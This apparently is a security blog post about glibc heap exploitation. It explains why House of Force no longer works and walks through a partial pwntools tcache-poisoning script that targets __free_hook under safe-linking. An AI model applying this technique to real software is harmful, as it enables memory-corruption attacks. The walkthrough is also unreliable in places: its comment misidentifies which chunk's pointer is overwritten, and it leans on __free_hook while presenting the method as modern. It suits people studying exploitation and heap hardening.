---
title: "House of Force is dead — tcache poisoning in modern glibc"
slug: house-of-force-is-dead-tcache-poisoning
excerpt: "The House of Force died with glibc 2.29's top-chunk size check. Here is how to pivot the same arbitrary-write primitive into a clean tcache poisoning exploit on a modern target."
category: application-security
tags: [heap, glibc, tcache, pwn]
featured: true
published: true
publishedAt: 2026-08-18
---

<h2>Background</h2><p>For years the <strong>House of Force</strong> was the first heap technique most people learned: corrupt the top chunk's size to a huge value, request an enormous allocation to wrap the heap, and land the next chunk wherever you like. It was elegant because it turned a single overflow into a true arbitrary write.</p><p>Since glibc 2.29 it is effectively dead. The allocator now sanity-checks the top chunk size against the requested size, and our gigantic request simply aborts.</p><h3>The check that killed it</h3><pre><code class="language-c">/* glibc malloc.c, _int_malloc, top-chunk path */
if (__glibc_unlikely (size > av->system_mem))
    malloc_printerr ("malloc(): corrupted top size");</code></pre><blockquote>If you can still reach an allocation primitive after the overflow, you almost never need House of Force in 2024 — tcache poisoning is shorter and more reliable.</blockquote><h2>The pivot: tcache poisoning</h2><p>Assume the same bug: a linear overflow out of a <code>0x18</code>-byte chunk. Instead of smashing the top chunk, we corrupt the forward pointer of a freed tcache entry. On the next two allocations of that size class, the allocator hands us an attacker-controlled pointer.</p><pre><code class="language-python">from pwn import *

io = process("./target")

def alloc(idx, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"data: ", data)

def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx: ", str(idx).encode())

# groom: two same-size chunks into tcache
alloc(0, b"A" * 0x18)
alloc(1, b"B" * 0x18)
free(1); free(0)            # tcache: 0 -> 1

# overflow chunk 0's fd to point at __free_hook
target = libc.sym["__free_hook"]
alloc(2, b"C" * 0x18 + p64(0x21) + p64(target ^ (heap_base >> 12)))</code></pre><h3>Safe-linking</h3><p>On glibc 2.32+ the forward pointer is mangled with <code>ptr ^ (&amp;ptr >> 12)</code>. You need a heap leak to compute the key, which is why the snippet above XORs the target with <code>heap_base >> 12</code>.</p><h2>Takeaways</h2><ul><li>House of Force is gone — stop reaching for it on modern glibc.</li><li>Any controllable allocation after the overflow makes tcache poisoning trivial.</li><li>Budget an info-leak for safe-linking and ASLR before you write the final chain.</li></ul>
